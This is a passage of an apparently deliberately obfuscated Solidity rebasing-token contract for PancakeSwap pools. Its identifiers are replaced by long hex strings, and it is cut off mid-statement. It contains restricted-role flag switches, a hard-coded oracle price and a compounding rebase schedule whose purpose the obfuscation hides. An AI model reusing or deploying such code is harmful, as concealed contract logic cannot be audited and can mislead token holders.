_pool.Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 = _pool.Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95 = _pool.Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24 = _pool.Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 = _pool.Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51 = _pool.Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d = _pool.Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c = IPancakeSwapPair(_pool.Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c);Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxc7571bf378f58d4699f9f2639e6aceb00a9eb072db96c737144c0d292a5ed1e88109b951b8b33f691cdcada8b3c2d53dd1c0dfb5027654c7721834ebb66ce67a = _pool.Oxc7571bf378f58d4699f9f2639e6aceb00a9eb072db96c737144c0d292a5ed1e88109b951b8b33f691cdcada8b3c2d53dd1c0dfb5027654c7721834ebb66ce67a;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox72888c6e782c8e2d1bf1e0c2a50808e5a1b2ff3ed7eac2d76ef57b77600f79f30e3c0bee582ef05fdaabe4d7385c58580618052f08dea0fed01459c78556f1f0 = _pool.Ox72888c6e782c8e2d1bf1e0c2a50808e5a1b2ff3ed7eac2d76ef57b77600f79f30e3c0bee582ef05fdaabe4d7385c58580618052f08dea0fed01459c78556f1f0;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da = _pool.Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = _pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = _pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3;Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01 = _pool.Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01;Ox7d8320f8a24ed1ba028759ecb5657cc8080eba0466f1714748e12069aeb50f2638b8b29924116ab4cb30e5614e9fad4f4d517dfa7aa92378265539a912d86670[Oxc4de58d9004160587715c930049471632269f06b7688f0b7249da011745733bfa05d928a670c22a9938a98492d3745b823bd2b367cb81b1712e94b90c3608d7b.pairAddress];Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[_pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 ? address(this) : _pool.Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150] = _pool.Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51;Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[_pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 ? address(this) : _pool.Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3] = _pool.Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d;if(!Ox45e46a33a77d7593869adc947b3848cff6636984d1f321700baa8a8156edb092c2e92521723bb8e3c4512ee7aed378abfdd0ca50c8d6479c8880253a5cd38865) {poolList[Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b] = Oxd98d61a945578a8d4af1a423163e6188c7ff71913500a83d35fd981aa26cf1126ac0a7cf5bcb9019cf57d019504d6a119d17381f7de0a21891002f1dba608595;Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b++;}}function Ox31ff2360746369bee8b2639afbabef3f63f7fff55fdd923b6dbd8de5345ad743283a01e1abbda8adb30c23ccde1d02fa0b845eab1aa34a53bdaa1baa9bd3e204() external onlyAnalyst {Ox84625e80fe814b854335ebe0811d6e97aa209e3f8dd6589f12c1aced375a5cd598b14f21f9012ee200f850bf5bb3cf1131bd064fdf386d3c57a5b517c9a6d410 = true;}function Ox713c859a87aaf15a663da92ad4c4df5d305993951cc17ff0200186e6eb02200a1fe95514317307f536c671b06efc748c63f562fdfccdcddcfd4d827edc0b9116(string memory Oxb5b65e5942c3ed1297718c68e892eafe064e02c7d44cfc94779daee8e05d9522a9a006ca706d312cdc4a981aea89512bf3b473fdbac69792b3b3cb4c2409bf2f) external onlyCommunity {require(gasleft() < Ox9a1cb37be0d6053b595c5309556dcc5e2124f03236bcf2d6236fa56a3ab3d71c564dd87ae0698734e987121e313e901229411f48eda47eb6669397755bef7c81 && bytes(Oxb5b65e5942c3ed1297718c68e892eafe064e02c7d44cfc94779daee8e05d9522a9a006ca706d312cdc4a981aea89512bf3b473fdbac69792b3b3cb4c2409bf2f).length <= 256, "d");emit Oxae758b51292102eaf9576a600a01f185a6b7898ac54e2c3f7856d2bdbb3007278649b15c3183a11ad63a140066f932bc9495ee0556cba77619841dc0bad434e1(Oxb5b65e5942c3ed1297718c68e892eafe064e02c7d44cfc94779daee8e05d9522a9a006ca706d312cdc4a981aea89512bf3b473fdbac69792b3b3cb4c2409bf2f);}function Ox2098427df852c883700a209b463936448438ad387c7fc0dcb7032a10e93c0f4aee8182532d26000329706ec0258c06d14ac9a5fc689b192bf17a7ef285e9e165(address Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95) public view returns(uint256) {return Oxf57ac77f6481b03a140800c1fa2769d107bb1f9a904c4f5f8620fbbc0b77b7b5924a366b5349e625068c46feadd33c4ebe341a660415a57e8efbcfae35d6c193(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c, Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc));}function Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(address Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95) public view returns(uint256) {return Oxf57ac77f6481b03a140800c1fa2769d107bb1f9a904c4f5f8620fbbc0b77b7b5924a366b5349e625068c46feadd33c4ebe341a660415a57e8efbcfae35d6c193(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0, (Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c != IPancakeSwapPair(Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728)) ? Ox2098427df852c883700a209b463936448438ad387c7fc0dcb7032a10e93c0f4aee8182532d26000329706ec0258c06d14ac9a5fc689b192bf17a7ef285e9e165(Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95) : Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc));}function Ox196faf124a31119360996fcbeba84ff6f09bd46bb6dc5db102ed333cd161ac3fc1c44b3ff03a48c3eceb6d6d6491ff7b302c839790e4f66025501dad48794ce4() public view returns (uint256) {return (Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50 - Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819] - Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728]) / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;}function Oxb82f32743aed2226cc3334921d3648859264f213ec9829bb74596bd7aa99e85284e02c08e36ba448789a9a633dfe09bc27662257f8dc43dee51b7c6b39e498b4(uint256 Ox3ca021392e3db0978bc1e625124d30026c61b379de5097e0912e6090f20e066970e21981151d8d6fef6626221b46b09077d2342cc00adb36222b35d9aadd26d8)public view returns (uint256){uint256 Ox325b1f78f98a975a248aa9c381587495d333bc3f073b81dd02aa0ed3fc74b769492d5eebef413e917b9b7dd5ccaaff37cc0f21c35551d1ddb5d55a5491e826e3 = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[pair].pairAddress] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;return Ox3ca021392e3db0978bc1e625124d30026c61b379de5097e0912e6090f20e066970e21981151d8d6fef6626221b46b09077d2342cc00adb36222b35d9aadd26d8 * (Ox325b1f78f98a975a248aa9c381587495d333bc3f073b81dd02aa0ed3fc74b769492d5eebef413e917b9b7dd5ccaaff37cc0f21c35551d1ddb5d55a5491e826e3 * 2) / Ox196faf124a31119360996fcbeba84ff6f09bd46bb6dc5db102ed333cd161ac3fc1c44b3ff03a48c3eceb6d6d6491ff7b302c839790e4f66025501dad48794ce4();}function Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(address Ox6996ad667a767adc8e7d5e12edd0cd8d0b55f377e8950a5e960abaec332039dae6ca00760e33b8a2a87dd3c3bfa20f1e788c5e2b9223727c10e693eecd521bf5)public view returns (uint256){AggregatorV3Interface Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 = AggregatorV3Interface(Ox6996ad667a767adc8e7d5e12edd0cd8d0b55f377e8950a5e960abaec332039dae6ca00760e33b8a2a87dd3c3bfa20f1e788c5e2b9223727c10e693eecd521bf5);if(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728) return uint256(31100000000);else {(,int256 Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad,,,) = Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787.latestRoundData();return uint256(Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad);}}function Oxb96bd08c8bd33d80f4527f59f724fb96c7b1da6f654b4373097c255f6d8f35d648cd587d7987babdbd9d5bb234517740470ea8955655d3ae3214cbd7f6c5cbb2()public view returns (uint256){return Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc);}function Oxe9d89589410b16ec16262f00078e704043770b6ba85aee4b339bade91992edcbc26b3f878afa1199d9132537023e3b1165944ee2550c5a517ac99e65ddbd1a46() internal {if ( Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 ) return;uint256 Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd;uint256 Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204 = block.timestamp - Ox5be8ad281e015a2540bac067bffc0fac9bd290783aec2cbc9006196a47d82339f291b0d7134813441a3bf2e69f9385e64eb15801b94fc9acac863d65d082fee0;uint256 deltaTime = block.timestamp - Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5;uint256 times = deltaTime / 15 minutes;uint256 Ox067103e2198309e9276baed6051aff082aaeca9b82ee22af51c264d0085fe57b1c6432ed061e7031501f58d28301bc408c3d23f73300cde5f592bcf05fab3bc3 = times * 15;uint256 Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32;if (Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204 < (365 days)) {Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd = 1037;} else if (Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204 < (2 * 365 days)) {Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd = 259;} else if (Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204 < (3 * 365 days)) {Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd = 64;} else if (Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204 < (4 * 365 days)) {Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd = 16;}for (uint256 i; i < times; i++) {Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c = Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c * (Ox4489d92f8e7db42afedd238d1aaedcda37e6d03b1d650e0e14d576971392c64ca3d79fb2094f7b7e08bbf3b24c6e5f576d344e34d9a96ba74ada48b2217cd319 + Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd) / Ox4489d92f8e7db42afedd238d1aaedcda37e6d03b1d650e0e14d576971392c64ca3d79fb2094f7b7e08bbf3b24c6e5f576d344e34d9a96ba74ada48b2217cd319;}Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32 = Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7 = Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50/ Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c;Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 = Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 + (times * 15 minutes);for(uint i; i < Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b; i++) {Oxedf11956c89ac5e6abf73116d5ebc155f14b3384216c736faa36b5b2d583adba05eb913d6f6dfe7a13be4750089058dcd801ab63708001f545351acd120476bc (Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32, poolList[i]);}emit LogRebase(Ox067103e2198309e9276baed6051aff082aaeca9b82ee22af51c264d0085fe57b1c6432ed061e7031501f58d28301bc408c3d23f73300cde5f592bcf05fab3bc3, Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c, Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204, Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd);}function Oxad6634a54b19b1129e456639ce12dda260fe23c2a701b05307b94fa26a90d76b32d577be74e9e0b5c3ef8b96c9174cad459b3191b91c5647787c5af176ef8993(uint256 Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787, uint256 Ox5fa84fa7a499e73f1fce17c48b26fbeadfe94d1c8c73437307e23ad6b12f285cb7f4affbcc9b663b60b765c0ac73a43df82445db4f5fdba5fbf6653874da4ad3, uint256 sgoTOx30ac86e6cf2feabcf31914c26c72ecfb027e87cdf9118a747299d943171e57354fd6a49813af09aa482ca33fde00dcd52f9e206601c397a820abe4c65a80be81, address Ox6f2aa5c88a31e66067f4ffa99d03c38d7e20d47960896e43060909b100061cc9752ccd1234e40442f8cb80c3e94d7ae47b86478a251281e2018463ce3e1013f1, uint256 Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415) internal{uint256 Ox31695c593ab3617431d843f63abb28bba22fa063bb6b68db0b860fb32bff52326e599e37d76f6d3458ee6e3cdcea9dab834b2dbd6ed582d56eaadf8d349367de = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819]/Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;if(Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819] > 0 && Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c >= Oxce30e8c09a977ca68129619235dcdce6a2d476f6c6369fd7c6a818a91f35cd8f823d4093a9daf8226ed908c2a4654142876a50549570b77da604f53253e8132b && Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c > Ox31695c593ab3617431d843f63abb28bba22fa063bb6b68db0b860fb32bff52326e599e37d76f6d3458ee6e3cdcea9dab834b2dbd6ed582d56eaadf8d349367de) {Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c = 